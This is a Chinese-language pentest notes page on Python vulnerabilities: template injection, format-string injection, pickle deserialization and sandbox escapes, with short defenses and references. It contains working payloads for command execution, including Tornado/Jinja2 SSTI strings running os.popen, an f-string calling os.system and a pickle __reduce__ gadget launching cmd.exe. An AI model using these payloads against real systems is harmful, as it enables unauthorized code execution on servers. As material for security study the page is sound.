Python漏洞
================================

模版注入
--------------------------------

模板引擎用于使用动态数据呈现内容。此上下文数据通常由用户控制并由模板进行格式化，以生成网页、电子邮件等。模板引擎通过使用代码构造（如条件语句、循环等）处理上下文数据，允许在模板中使用强大的语言表达式，以呈现动态内容。如果攻击者能够控制要呈现的模板，则他们将能够注入可暴露上下文数据，甚至在服务器上运行任意命令的表达式。

测试方法：

- 确定使用的引擎
- 查看引擎相关的文档，确定其安全机制以及自带的函数和变量
- 需找攻击面，尝试攻击

测试例子

- 简单的数学表达式，``{{ 7+7 }} => 14``
- 字符串表达式 ``{{ "ajin" }} => ajin``
- Tornado
    - 引用模块 ``{% import module %}``
    - => ``{% import os %}{{ os.popen("whoami").read() }}``
- Flask/Jinja2
    - ``{{ config.items() }}``
    - ``{{''.__class__.__mro__[2].__subclasses__()}}``
- Django
    - ``{{ request }}``
    - ``{% debug %}``
    - ``{% load module %}``
    - ``{% include "x.html" %}``
    - ``{% extends "x.html" %}``

目标：

- 创建对象
- 文件读写
- 远程文件包含
- 信息泄漏
- 提权


格式化字符串
--------------------------------


``"welcome {user}".format(user=user)``
``user = {0.__class__.__init__.__globals__}``

python3 -c "f'''{__import__('os').system('id')}'''"

反序列化
--------------------------------

pickle
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

::

    >>> class A(object):
    ...     a = 1
    ...     b = 2
    ...     def __reduce__(self):
    ...         return (subprocess.Popen, (('cmd.exe',),))
    ...
    >>> cPickle.dumps(A())
    "csubprocess\nPopen\np1\n((S'cmd.exe'\np2\ntp3\ntp4\nRp5\n."

PyYAML反序列化
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


沙箱
--------------------------------

绕过
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- 最简单的思路是在已有的模块中import，如果那个模块中已经 import 可以利用的模块就可以使用了

- 在父类中寻找可用的模块，最常见payload都是 ``().__class__.__bases__[0].__subclasses__()``

- 有些网站没有过滤 pickle 模块，可以使用 pickle 实现任意代码执行，生成 payload 可以使用 ``https://gist.github.com/freddyb/3360650``

- 有的沙箱把相关的模块代码都被删除了，则可以使用libc中的函数，Python 中调用一般可以使用 ctypes 或者 cffi。


防御
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Python官方给出了一些防御的建议

- 使用Jython并尝试使用Java平台来锁定程序的权限
- 使用fakeroot来避免
- 使用一些rootjail的技术


参考链接
--------------------------------
- `服务端模版注入 <https://zhuanlan.zhihu.com/p/28823933>`_
- `Python pickle反序列化 <http://www.91ri.org/9576.html>`_
- `Python 沙箱通用绕过 <https://www.anquanke.com/post/id/86366>`_
- `Python 沙箱 官方wiki <https://wiki.python.org/moin/SandboxedPython>`_